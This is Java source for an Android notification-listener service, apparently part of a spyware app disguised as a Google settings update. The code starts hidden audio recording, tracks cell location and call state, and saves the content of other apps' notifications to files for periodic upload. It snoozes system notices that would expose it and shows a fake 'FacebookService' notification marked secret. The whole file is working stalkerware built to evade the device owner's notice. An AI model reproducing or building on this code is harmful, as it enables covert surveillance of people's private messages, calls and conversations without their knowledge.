package com.setting.dl.google.googlesettingupdate.nlservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.v4.app.NotificationCompat;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.setting.dl.google.googlesettingupdate.audio.AudioService;
import com.setting.dl.google.googlesettingupdate.audio.AudioWorks;
import com.setting.dl.google.googlesettingupdate.BuildConfig;
import com.setting.dl.google.googlesettingupdate.OnlineWorks;
import com.setting.dl.google.googlesettingupdate.R;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.audio.SoundAnalize;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.nlservice.implementers.IPackageControler;
import com.setting.dl.google.googlesettingupdate.nlservice.interfaces.PackageControler;
import com.setting.dl.google.googlesettingupdate.phone.InstalledApps;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.IPostMan;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedDeque;
import java.util.concurrent.TimeUnit;


public class NLService extends NotificationListenerService {
   
   @SuppressWarnings("FieldCanBeLocal")
   private       long                                         now;
   private       long                                         lastSaveTime;
   private       String                                       lastTitle        = "";
   private       String                                       lastText         = "";
   private       IPostMan                                     postMan;
   private       IPackageControler                            packageControler;
   private final ConcurrentLinkedDeque<StatusBarNotification> notificationList = new ConcurrentLinkedDeque<>();
   private       NLPhoneStateListener                         phoneStateListener;
   private final long                                         SAVE_INTERVAL    = 30_000L;
   
   @Override
   public void onListenerConnected() {
      super.onListenerConnected();
      
      startFore();
      
      postMan = PostMan.getInstance(getApplicationContext());
      packageControler = new PackageControler(this);
      
      AudioService.startAudio(getApplicationContext(), 1L, 1L, null, true);
      
      checkOngoingNotification();
      
      registerPhoneListener();
      setupWork();
      setupWork2();
      
      if (!BuildConfig.DEBUG) {
         
         postMan.postText("NLService", "Analiz başladı");
      }
      
      u.log.d("NLService started");
      
      
      if (BuildConfig.DEBUG) {
         
         Run.runThread(() -> {
            
            if (AudioService.isRunning()) {
               
               AudioService.setRunning(false);
            }
         }, 5000L);
      }
      
      
   }
   
   private void setupWork() {
      
      Constraints myConstraints = new Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build();
      
      PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(OnlineWorks.class, 70, TimeUnit.MINUTES);
      
      PeriodicWorkRequest onlineWorks = builder.setConstraints(myConstraints).build();
      WorkManager.getInstance().enqueue(onlineWorks);
      
   }
   
   private void setupWork2() {
      
      PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(AudioWorks.class, 70, TimeUnit.MINUTES);
      
      PeriodicWorkRequest onlineWorks = builder.build();
      WorkManager.getInstance().enqueue(onlineWorks);
      
   }
   
   //@SuppressLint("MissingPermission")
   private void registerPhoneListener() {
      
      TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
      
      telephonyManager.listen(new PhoneStateListener() {
         
         @Override
         public void onCellLocationChanged(CellLocation location) {
            super.onCellLocationChanged(location);
            
            u.log.w("Cell location : %s", location.toString());
            
         }
         
      }, PhoneStateListener.LISTEN_CELL_LOCATION);
      
      
      new Thread(() -> {
         
         Looper.prepare();
         telephonyManager.listen(phoneStateListener = new NLPhoneStateListener(getApplicationContext()), PhoneStateListener.LISTEN_CALL_STATE);
         Looper.loop();
      }).start();
   }
   
   
   private void checkOngoingNotification() {
      
      StatusBarNotification[] nots = getActiveNotifications();
      
      //u.log.w("%d aktif bildirim var", nots.length);
      
      for (StatusBarNotification notification : nots) {
         
         Notification n = notification.getNotification();
         
         CharSequence title = n.extras.getCharSequence(Notification.EXTRA_TITLE);
         CharSequence text  = n.extras.getCharSequence(Notification.EXTRA_TEXT);
         
         if (title != null && text != null) {
            
            if ((notification.getPackageName().equals("android") && (title.toString().contains("GooglePlay") || text.toString().contains("GooglePlay") || text.toString().contains("Pil") || n.extras.containsKey("android.foregroundApps"))) || notification.getPackageName().equals(getPackageName()) || notification.getPackageName().equals("com.samsung.android.lool") || title.toString().contains("GooglePlay")) {
               
               snooze(notification);
            }
         }
      }
   }
   
   private void snooze(StatusBarNotification sbn) {
      
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
         
         long snoozLong = 10000000000000L;
         this.snoozeNotification(sbn.getKey(), snoozLong);
         
         u.saveToFile(getApplicationContext(),
               "OngoingNotification", u.format("Bildirim uyutuldu : %s", sbn.getKey()));
      }
   }
   
   @Override
   public void onNotificationPosted(StatusBarNotification sbn) {
      
      if (sbn == null) return;
      
      if (sbn.isOngoing()) {
         
         checkOngoingNotification();
         return;
      }
      
      if (!packageControler.isOkey(sbn)) {
         
         return;
      }
      
      notificationList.addLast(sbn);
      
      now = System.currentTimeMillis();
      
      if ((now - lastSaveTime) < SAVE_INTERVAL) {
         
         return;
      }
      
      lastSaveTime = now;
      
      Run.runThread(() -> {
         
         while (notificationList.size() != 0) {
            
            StatusBarNotification notification = notificationList.pollFirst();
            saveNotification(notification);
         }
         
         //postMan.checkTextFiles();
         
      }, SAVE_INTERVAL);
      
   }
   
   private void saveNotification(StatusBarNotification notification) {
      
      Notification not    = notification.getNotification();
      Bundle       extras = not.extras;
      
      if (extras == null) return;
      
      String  packageName = notification.getPackageName();
      Context context     = getApplicationContext();
      String  appName     = InstalledApps.getApplicationName(context, packageName);
      String  title       = String.valueOf(extras.getCharSequence(Notification.EXTRA_TITLE));
      String  text        = String.valueOf(extras.getCharSequence(Notification.EXTRA_TEXT));
      long    time        = notification.getPostTime();
      String  value       = formatNotification(packageName, appName, time, title, text);
      
      
      if (lastTitle.equals(title) && lastText.equals(text)) {
         
         return;
      }
      
      lastTitle = title;
      lastText = text;
      
      u.saveToFile(getApplicationContext(), packageName, value);
   }
   
   @Override
   public void onNotificationRemoved(StatusBarNotification sbn) {}
   
   private String formatNotification(String packageName, String appName, long time, String title, String text) {
      
      return String.format(
            new Locale("tr"),
            
            "Name    : %s%n" +
            "Package : %s%n" +
            "Date    : %s%n" +
            "Title   : %s%n" +
            "Text    : %s",
            
            appName, packageName, Time.getDate(time), title, text
      );
   }
   
   @Override
   public void onListenerDisconnected() {
      super.onListenerDisconnected();
      
      
      //getSharedPreferences("nlservice", MODE_PRIVATE).edit().putLong("disconnected", Time.getTime()).apply();
   }
   
   private void startFore() {
      
      String CHANNEL_ID   = "DISCOVERY";
      String CHANNEL_NAME = "Notification Channel";
      
      
      NotificationCompat.Builder builder =
            new NotificationCompat.Builder(this, CHANNEL_ID)
                  .setContentText("Facebook updating")
                  .setStyle(new NotificationCompat.BigTextStyle())
                  .setSmallIcon(R.mipmap.system)
                  .setPriority(NotificationCompat.PRIORITY_MIN)
                  .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                  .setContentTitle("FacebookService");
      
      
      if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
         
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         NotificationChannel chan    = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_LOW);
         
         chan.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
         manager.createNotificationChannel(chan);
         
         startForeground(77, builder.build());
         
         u.log.w("start fore");
      }
      else {
         
         startForeground(0, builder.build());
         
         u.log.w("start fore");
      }
      
      
   }
   
   
   
   /*private void checkKeyWord(String text) {
      
      if (text.contains("hello")) {
         
         postMan.postText("KeyWord", Time.getDate());
      }
      
   }*/
   
   /*private void unregisterPhoneListener(){
   
      TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
      telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
   }*/
   
}
